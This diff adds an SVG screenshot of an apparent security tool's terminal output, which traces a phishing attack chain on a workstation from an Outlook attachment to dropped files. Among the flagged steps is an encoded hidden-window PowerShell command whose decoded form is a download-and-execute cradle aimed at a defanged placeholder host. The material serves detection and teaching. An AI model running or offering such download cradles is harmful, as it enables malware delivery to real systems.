@@ -1,0 +1,395 @@
+<svg class="rich-terminal" viewBox="0 0 1482 2075.2" xmlns="http://www.w3.org/2000/svg">
+    <!-- Rendered with Rich https://www.textualize.io -->
+    <style>
+
+    @font-face {
+        font-family: "Fira Code";
+        src: local("FiraCode-Regular"),
+                url("https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Regular.woff2") format("woff2"),
+                url("https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Regular.woff") format("woff");
+        font-style: normal;
+        font-weight: 400;
+    }
+    @font-face {
+        font-family: "Fira Code";
+        src: local("FiraCode-Bold"),
+                url("https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Bold.woff2") format("woff2"),
+                url("https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Bold.woff") format("woff");
+        font-style: bold;
+        font-weight: 700;
+    }
+
+    .terminal-2458574024-matrix {
+        font-family: Fira Code, monospace;
+        font-size: 20px;
+        line-height: 24.4px;
+        font-variant-east-asian: full-width;
+    }
+
+    .terminal-2458574024-title {
+        font-size: 18px;
+        font-weight: bold;
+        font-family: arial;
+    }
+
+    .terminal-2458574024-r1 { fill: #292929;font-weight: bold }
+.terminal-2458574024-r2 { fill: #c5c8c6 }
+.terminal-2458574024-r3 { fill: #868887 }
+.terminal-2458574024-r4 { fill: #c5c8c6;font-weight: bold }
+.terminal-2458574024-r5 { fill: #98a84b }
+.terminal-2458574024-r6 { fill: #c5c8c6;font-style: italic; }
+.terminal-2458574024-r7 { fill: #cc555a;font-weight: bold }
+.terminal-2458574024-r8 { fill: #d0b344 }
+.terminal-2458574024-r9 { fill: #68a0b3 }
+.terminal-2458574024-r10 { fill: #d0b344;font-weight: bold }
+    </style>
+
+    <defs>
+    <clipPath id="terminal-2458574024-clip-terminal">
+      <rect x="0" y="0" width="1463.0" height="2024.1999999999998" />
+    </clipPath>
+    <clipPath id="terminal-2458574024-line-0">
+    <rect x="0" y="1.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-1">
+    <rect x="0" y="25.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-2">
+    <rect x="0" y="50.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-3">
+    <rect x="0" y="74.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-4">
+    <rect x="0" y="99.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-5">
+    <rect x="0" y="123.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-6">
+    <rect x="0" y="147.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-7">
+    <rect x="0" y="172.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-8">
+    <rect x="0" y="196.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-9">
+    <rect x="0" y="221.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-10">
+    <rect x="0" y="245.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-11">
+    <rect x="0" y="269.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-12">
+    <rect x="0" y="294.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-13">
+    <rect x="0" y="318.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-14">
+    <rect x="0" y="343.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-15">
+    <rect x="0" y="367.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-16">
+    <rect x="0" y="391.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-17">
+    <rect x="0" y="416.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-18">
+    <rect x="0" y="440.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-19">
+    <rect x="0" y="465.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-20">
+    <rect x="0" y="489.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-21">
+    <rect x="0" y="513.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-22">
+    <rect x="0" y="538.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-23">
+    <rect x="0" y="562.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-24">
+    <rect x="0" y="587.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-25">
+    <rect x="0" y="611.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-26">
+    <rect x="0" y="635.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-27">
+    <rect x="0" y="660.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-28">
+    <rect x="0" y="684.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-29">
+    <rect x="0" y="709.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-30">
+    <rect x="0" y="733.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-31">
+    <rect x="0" y="757.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-32">
+    <rect x="0" y="782.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-33">
+    <rect x="0" y="806.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-34">
+    <rect x="0" y="831.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-35">
+    <rect x="0" y="855.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-36">
+    <rect x="0" y="879.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-37">
+    <rect x="0" y="904.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-38">
+    <rect x="0" y="928.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-39">
+    <rect x="0" y="953.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-40">
+    <rect x="0" y="977.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-41">
+    <rect x="0" y="1001.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-42">
+    <rect x="0" y="1026.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-43">
+    <rect x="0" y="1050.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-44">
+    <rect x="0" y="1075.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-45">
+    <rect x="0" y="1099.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-46">
+    <rect x="0" y="1123.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-47">
+    <rect x="0" y="1148.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-48">
+    <rect x="0" y="1172.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-49">
+    <rect x="0" y="1197.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-50">
+    <rect x="0" y="1221.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-51">
+    <rect x="0" y="1245.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-52">
+    <rect x="0" y="1270.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-53">
+    <rect x="0" y="1294.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-54">
+    <rect x="0" y="1319.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-55">
+    <rect x="0" y="1343.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-56">
+    <rect x="0" y="1367.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-57">
+    <rect x="0" y="1392.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-58">
+    <rect x="0" y="1416.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-59">
+    <rect x="0" y="1441.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-60">
+    <rect x="0" y="1465.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-61">
+    <rect x="0" y="1489.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-62">
+    <rect x="0" y="1514.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-63">
+    <rect x="0" y="1538.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-64">
+    <rect x="0" y="1563.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-65">
+    <rect x="0" y="1587.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-66">
+    <rect x="0" y="1611.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-67">
+    <rect x="0" y="1636.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-68">
+    <rect x="0" y="1660.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-69">
+    <rect x="0" y="1685.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-70">
+    <rect x="0" y="1709.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-71">
+    <rect x="0" y="1733.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-72">
+    <rect x="0" y="1758.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-73">
+    <rect x="0" y="1782.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-74">
+    <rect x="0" y="1807.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-75">
+    <rect x="0" y="1831.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-76">
+    <rect x="0" y="1855.9" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-77">
+    <rect x="0" y="1880.3" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-78">
+    <rect x="0" y="1904.7" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-79">
+    <rect x="0" y="1929.1" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-80">
+    <rect x="0" y="1953.5" width="1464" height="24.65"/>
+            </clipPath>
+<clipPath id="terminal-2458574024-line-81">
+    <rect x="0" y="1977.9" width="1464" height="24.65"/>
+            </clipPath>
+    </defs>
+
+    <rect fill="#292929" stroke="rgba(255,255,255,0.35)" stroke-width="1" x="1" y="1" width="1480" height="2073.2" rx="8"/><text class="terminal-2458574024-title" fill="#c5c8c6" text-anchor="middle" x="740" y="27">lineage&#160;analyze&#160;phish_chain.jsonl&#160;--hot-only</text>
+            <g transform="translate(26,22)">
+            <circle cx="0" cy="0" r="7" fill="#ff5f57"/>
+            <circle cx="22" cy="0" r="7" fill="#febc2e"/>
+            <circle cx="44" cy="0" r="7" fill="#28c840"/>
+            </g>
+        
+    <g transform="translate(9, 41)" clip-path="url(#terminal-2458574024-clip-terminal)">
+    <rect fill="#c5c8c6" x="0" y="1.5" width="109.8" height="24.65" shape-rendering="crispEdges"/>
+    <g class="terminal-2458574024-matrix">
+    <text class="terminal-2458574024-r1" x="0" y="20" textLength="109.8" clip-path="url(#terminal-2458574024-line-0)">&#160;LINEAGE&#160;</text><text class="terminal-2458574024-r2" x="109.8" y="20" textLength="219.6" clip-path="url(#terminal-2458574024-line-0)">&#160;&#160;v1.0.0&#160;›&#160;analyze</text><text class="terminal-2458574024-r3" x="329.4" y="20" textLength="500.2" clip-path="url(#terminal-2458574024-line-0)">&#160;&#160;&#160;&#160;&#160;&#160;Process&#160;lineage&#160;&amp;&#160;attack&#160;storylines</text><text class="terminal-2458574024-r2" x="1464" y="20" textLength="12.2" clip-path="url(#terminal-2458574024-line-0)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="44.4" textLength="146.4" clip-path="url(#terminal-2458574024-line-1)">Input&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="44.4" textLength="561.2" clip-path="url(#terminal-2458574024-line-1)">phish_chain.jsonl&#160;·&#160;sha256&#160;db62…cedc&#160;·&#160;11.6&#160;KB</text><text class="terminal-2458574024-r2" x="1464" y="44.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-1)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="68.8" textLength="146.4" clip-path="url(#terminal-2458574024-line-2)">Hosts&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="68.8" textLength="219.6" clip-path="url(#terminal-2458574024-line-2)">ws-14.corp.example</text><text class="terminal-2458574024-r2" x="1464" y="68.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-2)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="93.2" textLength="146.4" clip-path="url(#terminal-2458574024-line-3)">Span&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="93.2" textLength="488" clip-path="url(#terminal-2458574024-line-3)">2026-10-12T10:00:00Z&#160;→&#160;11:01:10Z&#160;(1h01m)</text><text class="terminal-2458574024-r2" x="1464" y="93.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-3)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="117.6" textLength="146.4" clip-path="url(#terminal-2458574024-line-4)">Parameters&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="117.6" textLength="719.8" clip-path="url(#terminal-2458574024-line-4)">rules&#160;all&#160;·&#160;min&#160;severity&#160;info&#160;·&#160;gap&#160;10m&#160;·&#160;telemetry&#160;gap&#160;30m</text><text class="terminal-2458574024-r2" x="1464" y="117.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-4)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="142" textLength="146.4" clip-path="url(#terminal-2458574024-line-5)">Showing&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="158.6" y="142" textLength="109.8" clip-path="url(#terminal-2458574024-line-5)">hot&#160;only&#160;</text><text class="terminal-2458574024-r3" x="268.4" y="142" textLength="170.8" clip-path="url(#terminal-2458574024-line-5)">(display&#160;only)</text><text class="terminal-2458574024-r2" x="1464" y="142" textLength="12.2" clip-path="url(#terminal-2458574024-line-5)">
+</text><text class="terminal-2458574024-r4" x="12.2" y="166.4" textLength="146.4" clip-path="url(#terminal-2458574024-line-6)">Coverage&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r5" x="158.6" y="166.4" textLength="122" clip-path="url(#terminal-2458574024-line-6)">✓&#160;COMPLETE</text><text class="terminal-2458574024-r2" x="280.6" y="166.4" textLength="707.6" clip-path="url(#terminal-2458574024-line-6)">&#160;·&#160;events&#160;5,&#160;7,&#160;12,&#160;23&#160;absent&#160;(no&#160;enabled&#160;rule&#160;needs&#160;them)</text><text class="terminal-2458574024-r2" x="1464" y="166.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-6)">
+</text><text class="terminal-2458574024-r6" x="0" y="190.8" textLength="1146.8" clip-path="url(#terminal-2458574024-line-7)">Storylines&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="190.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-7)">
+</text><text class="terminal-2458574024-r2" x="1464" y="215.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-8)">
+</text><text class="terminal-2458574024-r4" x="24.4" y="239.6" textLength="24.4" clip-path="url(#terminal-2458574024-line-9)">ID</text><text class="terminal-2458574024-r4" x="85.4" y="239.6" textLength="134.2" clip-path="url(#terminal-2458574024-line-9)">Root&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r4" x="256.2" y="239.6" textLength="219.6" clip-path="url(#terminal-2458574024-line-9)">Host&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r4" x="512.4" y="239.6" textLength="73.2" clip-path="url(#terminal-2458574024-line-9)">Max&#160;&#160;&#160;</text><text class="terminal-2458574024-r4" x="622.2" y="239.6" textLength="85.4" clip-path="url(#terminal-2458574024-line-9)">Tactics</text><text class="terminal-2458574024-r4" x="744.2" y="239.6" textLength="97.6" clip-path="url(#terminal-2458574024-line-9)">Findings</text><text class="terminal-2458574024-r4" x="878.4" y="239.6" textLength="244" clip-path="url(#terminal-2458574024-line-9)">Start&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="1464" y="239.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-9)">
+</text><text class="terminal-2458574024-r2" x="0" y="264" textLength="1146.8" clip-path="url(#terminal-2458574024-line-10)">&#160;────────────────────────────────────────────────────────────────────────────────────────────&#160;</text><text class="terminal-2458574024-r2" x="1464" y="264" textLength="12.2" clip-path="url(#terminal-2458574024-line-10)">
+</text><text class="terminal-2458574024-r2" x="24.4" y="288.4" textLength="24.4" clip-path="url(#terminal-2458574024-line-11)">S1</text><text class="terminal-2458574024-r2" x="85.4" y="288.4" textLength="134.2" clip-path="url(#terminal-2458574024-line-11)">OUTLOOK.EXE</text><text class="terminal-2458574024-r2" x="256.2" y="288.4" textLength="219.6" clip-path="url(#terminal-2458574024-line-11)">ws-14.corp.example</text><text class="terminal-2458574024-r7" x="512.4" y="288.4" textLength="48.8" clip-path="url(#terminal-2458574024-line-11)">HIGH</text><text class="terminal-2458574024-r2" x="622.2" y="288.4" textLength="85.4" clip-path="url(#terminal-2458574024-line-11)">&#160;&#160;&#160;&#160;&#160;&#160;4</text><text class="terminal-2458574024-r2" x="744.2" y="288.4" textLength="97.6" clip-path="url(#terminal-2458574024-line-11)">&#160;&#160;&#160;&#160;&#160;&#160;&#160;8</text><text class="terminal-2458574024-r2" x="878.4" y="288.4" textLength="244" clip-path="url(#terminal-2458574024-line-11)">2026-10-12T10:01:00Z</text><text class="terminal-2458574024-r2" x="1464" y="288.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-11)">
+</text><text class="terminal-2458574024-r2" x="24.4" y="312.8" textLength="24.4" clip-path="url(#terminal-2458574024-line-12)">S2</text><text class="terminal-2458574024-r2" x="85.4" y="312.8" textLength="134.2" clip-path="url(#terminal-2458574024-line-12)">upd.exe&#160;&#160;&#160;&#160;</text><text class="terminal-2458574024-r2" x="256.2" y="312.8" textLength="219.6" clip-path="url(#terminal-2458574024-line-12)">ws-14.corp.example</text><text class="terminal-2458574024-r8" x="512.4" y="312.8" textLength="73.2" clip-path="url(#terminal-2458574024-line-12)">MEDIUM</text><text class="terminal-2458574024-r2" x="622.2" y="312.8" textLength="85.4" clip-path="url(#terminal-2458574024-line-12)">&#160;&#160;&#160;&#160;&#160;&#160;3</text><text class="terminal-2458574024-r2" x="744.2" y="312.8" textLength="97.6" clip-path="url(#terminal-2458574024-line-12)">&#160;&#160;&#160;&#160;&#160;&#160;&#160;3</text><text class="terminal-2458574024-r2" x="878.4" y="312.8" textLength="244" clip-path="url(#terminal-2458574024-line-12)">2026-10-12T11:00:00Z</text><text class="terminal-2458574024-r2" x="1464" y="312.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-12)">
+</text><text class="terminal-2458574024-r2" x="1464" y="337.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-13)">
+</text><text class="terminal-2458574024-r2" x="1464" y="361.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-14)">
+</text><text class="terminal-2458574024-r4" x="0" y="386" textLength="24.4" clip-path="url(#terminal-2458574024-line-15)">S1</text><text class="terminal-2458574024-r2" x="24.4" y="386" textLength="671" clip-path="url(#terminal-2458574024-line-15)">&#160;·&#160;root&#160;OUTLOOK.EXE&#160;·&#160;ws-14.corp.example&#160;·&#160;CORP\jdoe&#160;·&#160;</text><text class="terminal-2458574024-r7" x="695.4" y="386" textLength="48.8" clip-path="url(#terminal-2458574024-line-15)">HIGH</text><text class="terminal-2458574024-r2" x="744.2" y="386" textLength="622.2" clip-path="url(#terminal-2458574024-line-15)">&#160;·&#160;4&#160;tactics&#160;·&#160;8&#160;findings&#160;·&#160;2026-10-12T10:01:00Z&#160;→&#160;</text><text class="terminal-2458574024-r2" x="1464" y="386" textLength="12.2" clip-path="url(#terminal-2458574024-line-15)">
+</text><text class="terminal-2458574024-r2" x="0" y="410.4" textLength="207.4" clip-path="url(#terminal-2458574024-line-16)">10:02:40Z&#160;(1m40s)</text><text class="terminal-2458574024-r2" x="1464" y="410.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-16)">
+</text><text class="terminal-2458574024-r3" x="0" y="434.8" textLength="256.2" clip-path="url(#terminal-2458574024-line-17)">explorer.exe&#160;(anchor)</text><text class="terminal-2458574024-r2" x="1464" y="434.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-17)">
+</text><text class="terminal-2458574024-r3" x="0" y="459.2" textLength="48.8" clip-path="url(#terminal-2458574024-line-18)">└──&#160;</text><text class="terminal-2458574024-r3" x="48.8" y="459.2" textLength="134.2" clip-path="url(#terminal-2458574024-line-18)">OUTLOOK.EXE</text><text class="terminal-2458574024-r2" x="1464" y="459.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-18)">
+</text><text class="terminal-2458574024-r3" x="48.8" y="483.6" textLength="48.8" clip-path="url(#terminal-2458574024-line-19)">└──&#160;</text><text class="terminal-2458574024-r3" x="97.6" y="483.6" textLength="1342" clip-path="url(#terminal-2458574024-line-19)">WINWORD.EXE&#160;/n&#160;&quot;C:\Users\jdoe\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\Q3TX9L2B\invoice.docm&quot;</text><text class="terminal-2458574024-r2" x="1464" y="483.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-19)">
+</text><text class="terminal-2458574024-r3" x="97.6" y="508" textLength="48.8" clip-path="url(#terminal-2458574024-line-20)">└──&#160;</text><text class="terminal-2458574024-r7" x="146.4" y="508" textLength="12.2" clip-path="url(#terminal-2458574024-line-20)">!</text><text class="terminal-2458574024-r2" x="158.6" y="508" textLength="524.6" clip-path="url(#terminal-2458574024-line-20)">&#160;cmd.exe&#160;/c&#160;powershell&#160;-nop&#160;-w&#160;hidden&#160;-enc&#160;</text><text class="terminal-2458574024-r2" x="1464" y="508" textLength="12.2" clip-path="url(#terminal-2458574024-line-20)">
+</text><text class="terminal-2458574024-r2" x="146.4" y="532.4" textLength="1073.6" clip-path="url(#terminal-2458574024-line-21)">SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEA…&#160;&#160;</text><text class="terminal-2458574024-r3" x="1220" y="532.4" textLength="97.6" clip-path="url(#terminal-2458574024-line-21)">decoded:</text><text class="terminal-2458574024-r2" x="1317.6" y="532.4" textLength="61" clip-path="url(#terminal-2458574024-line-21)">&#160;IEX&#160;</text><text class="terminal-2458574024-r2" x="1464" y="532.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-21)">
+</text><text class="terminal-2458574024-r2" x="146.4" y="556.8" textLength="707.6" clip-path="url(#terminal-2458574024-line-22)">(New-Object&#160;Net.WebClient).DownloadString(&#x27;hxxp[://]203…&#160;&#160;</text><text class="terminal-2458574024-r7" x="854" y="556.8" textLength="183" clip-path="url(#terminal-2458574024-line-22)">CMD-001&#160;LIN-001</text><text class="terminal-2458574024-r2" x="1464" y="556.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-22)">
+</text><text class="terminal-2458574024-r3" x="146.4" y="581.2" textLength="48.8" clip-path="url(#terminal-2458574024-line-23)">└──&#160;</text><text class="terminal-2458574024-r7" x="195.2" y="581.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-23)">!</text><text class="terminal-2458574024-r2" x="207.4" y="581.2" textLength="573.4" clip-path="url(#terminal-2458574024-line-23)">&#160;powershell.exe&#160;powershell&#160;-nop&#160;-w&#160;hidden&#160;-enc&#160;</text><text class="terminal-2458574024-r2" x="1464" y="581.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-23)">
+</text><text class="terminal-2458574024-r2" x="195.2" y="605.6" textLength="1110.2" clip-path="url(#terminal-2458574024-line-24)">SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8A…&#160;&#160;</text><text class="terminal-2458574024-r3" x="1305.4" y="605.6" textLength="97.6" clip-path="url(#terminal-2458574024-line-24)">decoded:</text><text class="terminal-2458574024-r2" x="1403" y="605.6" textLength="61" clip-path="url(#terminal-2458574024-line-24)">&#160;IEX&#160;</text><text class="terminal-2458574024-r2" x="1464" y="605.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-24)">
+</text><text class="terminal-2458574024-r2" x="195.2" y="630" textLength="707.6" clip-path="url(#terminal-2458574024-line-25)">(New-Object&#160;Net.WebClient).DownloadString(&#x27;hxxp[://]203…&#160;&#160;</text><text class="terminal-2458574024-r7" x="902.8" y="630" textLength="268.4" clip-path="url(#terminal-2458574024-line-25)">CMD-001&#160;CMD-002&#160;GR-001</text><text class="terminal-2458574024-r2" x="1464" y="630" textLength="12.2" clip-path="url(#terminal-2458574024-line-25)">
+</text><text class="terminal-2458574024-r3" x="195.2" y="654.4" textLength="48.8" clip-path="url(#terminal-2458574024-line-26)">├──&#160;</text><text class="terminal-2458574024-r3" x="244" y="654.4" textLength="36.6" clip-path="url(#terminal-2458574024-line-26)">net</text><text class="terminal-2458574024-r2" x="280.6" y="654.4" textLength="451.4" clip-path="url(#terminal-2458574024-line-26)">&#160;→&#160;203.0.113.10:80/tcp&#160;(dl[.]example)</text><text class="terminal-2458574024-r2" x="1464" y="654.4" textLength="12.2" clip-path="url(#terminal-2458574024-line-26)">
+</text><text class="terminal-2458574024-r3" x="195.2" y="678.8" textLength="48.8" clip-path="url(#terminal-2458574024-line-27)">├──&#160;</text><text class="terminal-2458574024-r3" x="244" y="678.8" textLength="36.6" clip-path="url(#terminal-2458574024-line-27)">dns</text><text class="terminal-2458574024-r2" x="280.6" y="678.8" textLength="158.6" clip-path="url(#terminal-2458574024-line-27)">&#160;dl[.]example</text><text class="terminal-2458574024-r2" x="1464" y="678.8" textLength="12.2" clip-path="url(#terminal-2458574024-line-27)">
+</text><text class="terminal-2458574024-r3" x="195.2" y="703.2" textLength="48.8" clip-path="url(#terminal-2458574024-line-28)">├──&#160;</text><text class="terminal-2458574024-r3" x="244" y="703.2" textLength="48.8" clip-path="url(#terminal-2458574024-line-28)">file</text><text class="terminal-2458574024-r2" x="292.8" y="703.2" textLength="292.8" clip-path="url(#terminal-2458574024-line-28)">&#160;C:\Users\Public\upd.exe</text><text class="terminal-2458574024-r2" x="1464" y="703.2" textLength="12.2" clip-path="url(#terminal-2458574024-line-28)">
+</text><text class="terminal-2458574024-r3" x="195.2" y="727.6" textLength="48.8" clip-path="url(#terminal-2458574024-line-29)">├──&#160;</text><text class="terminal-2458574024-r3" x="244" y="727.6" textLength="48.8" clip-path="url(#terminal-2458574024-line-29)">file</text><text class="terminal-2458574024-r2" x="292.8" y="727.6" textLength="317.2" clip-path="url(#terminal-2458574024-line-29)">&#160;C:\Users\Public\stage.dll</text><text class="terminal-2458574024-r2" x="1464" y="727.6" textLength="12.2" clip-path="url(#terminal-2458574024-line-29)">
